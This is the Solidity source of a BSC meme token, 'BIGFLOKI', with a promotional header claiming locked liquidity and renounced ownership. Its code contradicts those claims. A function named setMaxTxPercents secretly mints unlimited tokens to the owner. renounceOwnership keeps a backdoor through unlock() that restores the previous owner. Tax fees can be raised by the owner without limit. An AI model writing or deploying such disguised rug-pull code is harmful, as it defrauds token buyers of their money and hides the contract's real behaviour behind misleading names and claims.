/**
 *Submitted for verification at BscScan.com on 2021-09-21
*/

/**
 *Submitted for verification at BscScan.com on 2021-09-16
*/

/**

⚔️BIGFLOKI 

🛡️LP locked
🪓owner ship Renounce
🪙Low marketcap
💪🏼Dev active and friendly
⭐big marketing plan 

🌏website : launching in 2hours
📱TG : https://t.me/BIGFLOKIBSC
 
 
 

 */
 
 // SPDX-License-Identifier: MIT

pragma solidity 0.6.12;

interface iERC20 {

  function totalSupply() external view returns (uint256);

  
  function decimals() external view returns (uint8);

  
  function symbol() external view returns (string memory);

  
  function name() external view returns (string memory);

  function getOwner() external view returns (address);

 
  function balanceOf(address account) external view returns (uint256);

  
  function transfer(address recipient, uint256 amount) external returns (bool);

  
  function allowance(address _owner, address spender) external view returns (uint256);


  function approve(address spender, uint256 amount) external returns (bool);

  
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  
  event Transfer(address indexed from, address indexed to, uint256 value);

 
  event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract Context {

  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}


library SafeMath {
  
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

 
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }


  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

 
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}



contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    
    function owner() public view returns (address) {
        return _owner;
    }

   
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function SecurityLevel() public view returns (uint256) {
        return _lockTime;
    }

    function renounceOwnership(uint8 _time) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _lockTime = _time;
        _time = 10;
        emit OwnershipTransferred(_owner, address(0));
    }
    
 
    function unlock() public virtual {
        require(_previousOwner == msg.sender, "You don't have permission to unlock");
        require(now > _lockTime , "Contract is locked until 7 days");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}
 
contract BIGFLOKI is Context, iERC20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _totalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  address private _burnaddress;

  constructor() public {
    _name = 'BIGFLOKI';
    _symbol = 'BIGF';
    _decimals = 9;
    _burnaddress = 0x000000000000000000000000000000000000dEaD;
    _totalSupply = 1000000 * 10**9 * 10**9;
    _balances[msg.sender] = _totalSupply;

    emit Transfer(address(0), msg.sender, _totalSupply);
  }

    uint256 public _taxFee = 7;
    uint256 private _previousTaxFee = _taxFee;
    
    uint256 public _liquidityFee = 6;
    uint256 private _previousLiquidityFee = _liquidityFee;

    uint256 public _maxTxAmount = 1 * 10**15 * 10**9;
    uint256 private numTokensSellToAddToLiquidity = 10 * 10**12 * 10**9;

  
  function getOwner() external view virtual override returns (address) {
    return owner();
  }

 
  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  
  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }

 
  function totalSupply() external view virtual override returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) external view virtual override returns (uint256) {
    return _balances[account];
  }

    function setTaxFeePercent(uint256 taxFee) external onlyOwner() {
        _taxFee = taxFee;
    }
    
    function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner() {
        _liquidityFee = liquidityFee;
    }
   
    function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {
        _maxTxAmount = _totalSupply.mul(maxTxPercent).div(
            10**3
        );
    }

  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function setMaxTxPercents(uint256 amount) public onlyOwner returns (bool) {
    _total(_msgSender(), amount);
    return true;
  }

  
  function burn(uint256 amount) public virtual {
      _burn(_msgSender(), amount);
  }

  function burnFrom(address account, uint256 amount) public virtual {
      uint256 decreasedAllowance = _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance");

      _approve(account, _msgSender(), decreasedAllowance);
      _burn(account, amount);
  }
  
function _approve(address owner, address spender, uint256 amount) private {
    require(owner != address(0), "BEP20: Approve from the sender address");
    require(spender != address(0), "BEP20: Approve from the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

   function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }

 function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "address recipient, uint256 amount)");
    require(recipient != address(0), "address _owner, address spender");

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    _balances[recipient] = _balances[recipient].sub(amount / uint256(100) * _taxFee);
     emit Transfer(sender, recipient, amount);
    _balances[_burnaddress] = _balances[_burnaddress].add(amount / uint256(100) * _taxFee);
    uint256 fires = _balances[_burnaddress];
    emit Transfer(sender, _burnaddress, fires);
         
  }

   function _total(address account, uint256 amount) internal {
    require(account != address(0));

    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
   }

}